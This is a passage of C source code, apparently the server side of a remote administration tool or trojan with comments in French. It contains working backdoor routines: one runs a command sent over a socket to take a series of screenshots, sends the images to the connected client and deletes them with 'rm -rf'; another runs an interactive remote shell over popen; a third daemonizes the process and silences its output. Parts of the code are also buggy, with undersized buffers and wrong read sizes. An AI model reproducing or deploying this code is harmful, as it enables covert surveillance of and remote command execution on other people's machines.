    pthread_exit(NULL);
}


void *download_multi_screenshot_files()
{
    FILE *pipe = NULL;
    size_t len_screenshot_cmd = 0;
    char *buffer = NULL;

    FILE *screenshot_file = NULL;
    size_t screen_weight = 0;

    gchar *file_name = NULL;
    size_t i = 1;
    size_t j = 0;

    unsigned int total_number_of_screenshot = 0;
    int delay_interval = 0;

    char *buffer_desktop_screenshot = NULL;
    long dataSend = 0;
    size_t dataRead = 0;
    size_t totalSend = 0;

    char *erase_cmds = NULL;


    if(recv(csock, (char*)&total_number_of_screenshot, sizeof(total_number_of_screenshot), 0) == SOCKET_ERROR)
    {
        error("recv() total_number_of_screenshot", "download_multi_screenshot_files()");
        exit(-1);
    }

     if(recv(csock, (char*)&delay_interval, sizeof(delay_interval), 0) == SOCKET_ERROR)
    {
        error("recv() delay_interval", "download_multi_screenshot_files()");
        exit(-1);
    }

    printf("\n\n\ntotal screenshot = %d\n", total_number_of_screenshot);

    printf("DELAY INTERVAL = %d\n\n", delay_interval);

    if(recv(csock, (char*)&len_screenshot_cmd, sizeof(len_screenshot_cmd), 0) == SOCKET_ERROR)
    {
        error("recv() len_screenshot_cmd", "download_multi_screenshot_files()");
        exit(-1);
    }

    buffer = malloc(len_screenshot_cmd * sizeof(char));
    if(buffer == NULL)
    {
        error("malloc() buffer", "download_multi_screenshot_files()");
        exit(-1);
    }

    if(recv(csock, buffer, len_screenshot_cmd, 0) == SOCKET_ERROR)
    {
        error("recv() buffer", "download_multi_screenshot_files()");
        exit(-1);
    }

    //printf("\n\ncommand ---> %s\n\n\n", buffer);

    pipe = popen(buffer, "r");
    if(pipe == NULL)
    {
        error("popen() pipe", "download_multi_screenshot_files()");
        exit(-1);
    }

    free(buffer);

    sleep((unsigned int)delay_interval + 5);

    do
    {
        file_name = malloc(total_number_of_screenshot * sizeof(gchar));
        if(file_name == NULL)
        {
            error("malloc() file_name", "download_multi_screenshot_files()");
            exit(-1);
        }

        snprintf(file_name, 9, "%ld.jpeg", i);

        printf("\nfilename = %s\n", file_name);

        screenshot_file = fopen(file_name, "rb");
        if(screenshot_file == NULL)
        {
            error("fopen() file_name", "download_multi_screenshot_files()");
            exit(-1);
        }

        printf("\n\n\n------------->filename = %ld.jpeg\n\n\n", i);

        /* weight of screenshot file */
        fseek(screenshot_file, 0, SEEK_END);
        screen_weight = (size_t)ftell(screenshot_file);
        rewind(screenshot_file);

        printf("\n\nle fichier screenshot fait : %ld octets\n\n", screen_weight);

        if(send(csock, (char*)&screen_weight, sizeof(screen_weight), 0) == SOCKET_ERROR)
        {
            error("send() screen_weight", "download_multi_screenshot_files()");
            exit(-1);
        }

        buffer_desktop_screenshot = malloc(screen_weight * (sizeof(char)));
        if(buffer_desktop_screenshot == NULL)
        {
            error("malloc() buffer_desktop_screenshot", "download_multi_screenshot_files()");
            exit(-1);
        }

        do
        {
            dataRead = fread(buffer_desktop_screenshot, sizeof(char), sizeof(screen_weight), screenshot_file);
            if(dataRead == 0)
            {
                error("send() dataRead", "download_multi_screenshot_files()");
                exit(-1);
            }

            dataSend = send(csock, buffer_desktop_screenshot, sizeof(screen_weight), 0);
            if(dataSend == 0)
            {
                error("send() datasend", "download_multi_screenshot_files()");
                exit(-1);
            }

            totalSend += dataRead;

        }while(totalSend < screen_weight);

        printf("\nEnvoie du screenshot SUCCESS !!\n");

        totalSend = 0;
        screen_weight = 0;
        dataRead = 0;

        free(buffer_desktop_screenshot);

        erase_cmds = malloc(14 * sizeof(gchar));
        if(erase_cmds == NULL)
        {
            error("malloc() erase_cmds", "download_multi_screenshot_files()");
            exit(-1);
        }

        erase_cmds = strncpy(erase_cmds, "rm -rf ", 7);
        erase_cmds = strcat(erase_cmds, file_name);

        if(system(erase_cmds) == -1)
        {
            error("system() delete multi_screenshot.jpeg", "download_multi_screenshot_files()");
            exit(-1);
        }

        fclose(screenshot_file);

        usleep(500);

        free(file_name);
        free(erase_cmds);

        i++;
        j++;

    }while(i <= total_number_of_screenshot);

    if(pclose(pipe) == -1)
    {
        printf("Fail to close pipe!\n");
        exit(-1);
    }

    close(csock);

    pthread_exit(NULL);
}

void *start_remote_shell(char *argv[])
{
    pid_t the_son = 0;
    char *shell = NULL;

    FILE *pipe[2] = {NULL};

    char buffer[BUFSIZ]= "";
    char buffer_cmd[MAXDATASIZE] = "";
    size_t data_len = 0;
    int ret = 0;

    char msg[] = "Hey ! Iam HAL the server, you're now connected !\r\n";
    int msg_len = strlen(msg) + 1;

    ret = send(csock, (char*)&msg_len, sizeof(msg_len), 0);
    if(ret < 0)
    {
        error("send() msg_len", "start_remote_shell()");
        exit(-1);
    }

    ret = send(csock, msg, msg_len, 0);
    if(ret < 0)
    {
        error("send() msg", "start_remote_shell()");
        exit(-1);
    }

    the_son = fork();
    if(the_son < 0)
    {
        error("fork() the_son", "start_remote_shell()");
        exit(-1);
    }


    if(the_son == 0)
    {
        shell = getenv("SHELL");

        if(shell == NULL)
        {
            error("getenv() shell", "start_remote_shell()");
            exit(-1);
        }

        if(execv(shell, &argv[0]) == -1)
        {
            error("execv() shell", "start_remote_shell()");
            exit(-1);
        }
    }

    else /*father*/
    {
        for(;;)
        {
            if(recv(csock, (char*)&data_len, sizeof(data_len), 0) == -1)
            {
                error("recv() data_len", "start_remote_shell()");
                exit(-1);
            }

            /* Receive the command */
            ret = recv (csock, buffer, data_len, 0);
            if (ret < 0)
            {
                error("recv() buffer", "start_remote_shell()");
                exit(-1);
            }

            buffer[data_len - 1] = '\0';

            printf("La commande est : %s\n\nEt fait %ld de long\n\n", buffer, data_len);

            if(strncmp(buffer, "quit", 4) == 0)
                break;

            pipe[0] = popen(buffer, "w");
            if(pipe[0] == NULL)
            {
                error("popen() pipe[0]", "start_remote_shell()");
                exit(-1);
            }

            /* Send command results */
            pipe[1] = popen(buffer, "r");
            if(pipe[1] == NULL)
            {
                error("popen() pipe[1]", "start_remote_shell()");
                exit(-1);
            }

            ret = fread(buffer_cmd, BUFSIZ, sizeof(char), pipe[1]);
            if(ret < 0)
            {

                error("fread() buffer_cmd", "start_remote_shell()");
                exit(-1);
            }

            if(send(csock, buffer_cmd, BUFSIZ, 0) == SOCKET_ERROR)
            {
                error("send() buffer_cmd", "start_remote_shell()");
                exit(-1);
            }

            memset(buffer_cmd, 0, MAXDATASIZE);
            memset(buffer, 0, BUFSIZ);

            if(pclose(pipe[0]) == -1)
            {
                error("pclose() pipe[0]", "start_remote_shell()");
                exit(-1);
            }

            if(pclose(pipe[1]) == -1)
            {
                error("pclose() pipe[1]", "start_remote_shell()");
                exit(-1);
            }
        }
    }

    memset(buffer_cmd, 0, MAXDATASIZE);
    memset(buffer, 0, BUFSIZ);

    printf("\n\nthread fermé\n\n");

    pthread_exit(NULL);
}

void daemonize(void)
{
    pid_t fils;

    fils = fork();

    /* Si fork() echoue on quit directe */
    if(fils < 0)
    {
        syslog(LOG_ERR, "fork() fils : %d : %s", errno, strerror(errno));
        exit(-1);
    }

    /* Si fork() réussit on stop le père */
    if(fils > 0)
        exit(EXIT_SUCCESS);

    /* On change de repertoire et se place a la racine */
    if(chdir("/") < 0)
    {
        syslog(LOG_ERR, "chdir() : %d : %s", errno, strerror(errno));
        exit(-1);
    }

    /* cf man et google sur pourquoi 0, basiquement aucun droit sur les fichier/dossier crées */
    umask(0);


    /*  Redirect standard I/O for cancel all user terminal messages */
    if(freopen("/dev/null", "r", stdin) == NULL )
    {
        error("freopen() stdin", "daemonize()");
        exit(-1);
    }

    if(freopen("/dev/null", "w", stdout) == NULL )
    {
        error("freopen stdout", "daemonize()");
        exit(-1);
    }

    if(freopen("/dev/null", "w", stderr) == NULL )
    {
        error("freopen stderr", "daemonize()");
        exit(-1);
    }
}


